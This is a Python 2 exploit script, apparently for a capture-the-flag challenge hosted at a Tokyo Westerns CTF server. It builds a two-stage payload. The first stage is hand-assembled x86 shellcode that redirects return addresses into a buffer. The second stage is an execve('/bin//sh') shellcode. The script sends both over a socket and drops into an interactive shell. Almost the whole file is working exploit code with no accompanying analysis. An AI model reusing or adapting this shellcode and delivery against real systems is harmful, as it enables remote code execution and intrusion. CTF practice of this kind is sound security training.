import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

# 00000000  89E2                      mov edx,esp
# 00000002  92                        xchg eax,edx
# 00000003  91                        xchg eax,ecx
# 00000004  81E9F1F1F1F1              sub ecx,0xf1f1f1f1
# 0000000A  81A9F1F1F1F1E8898888      sub dword [ecx-0xe0e0e0f],0x888889e8      # modifies return from shellcode to point at read_string()
# 00000014  8181F1F1F1F182878888      add dword [ecx-0xe0e0e0f],0x88888782
# 0000001E  92                        xchg eax,edx
# 0000001F  8981F5F1F1F1              mov [ecx-0xe0e0e0b],eax                   # sets return address from read_string() to start of shellcode buffer
# 00000025  8981F9F1F1F1              mov [ecx-0xe0e0e07],eax                   # sets arg for read_string() to start of shellcode buffer
# 0000002B  C3                        ret
    

stage1 = binascii.a2b_hex('89e2'+'92'+'91'+'81e9f1f1f1f1'+'81a9f1f1f1f1e8898888'+'8181f1f1f1f182878888'+'92'+'8981f5f1f1f1'+'8981f9f1f1f1'+'c3')
print stage1.decode("cp500")
stage1 = stage1.ljust(128, "\x88")

stage2 = "\x31\xc0\x50\x68\x2f\x2f\x73"+"\x68\x68\x2f\x62\x69\x6e\x89"+"\xe3\x89\xc1\x89\xc2\xb0\x0b"+"\xcd\x80\x31\xc0\x40\xcd\x80"

sc = socket.create_connection(("pwn2.chal.ctf.westerns.tokyo", 12121))
sc.send(stage1)
sc.send(stage2)

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    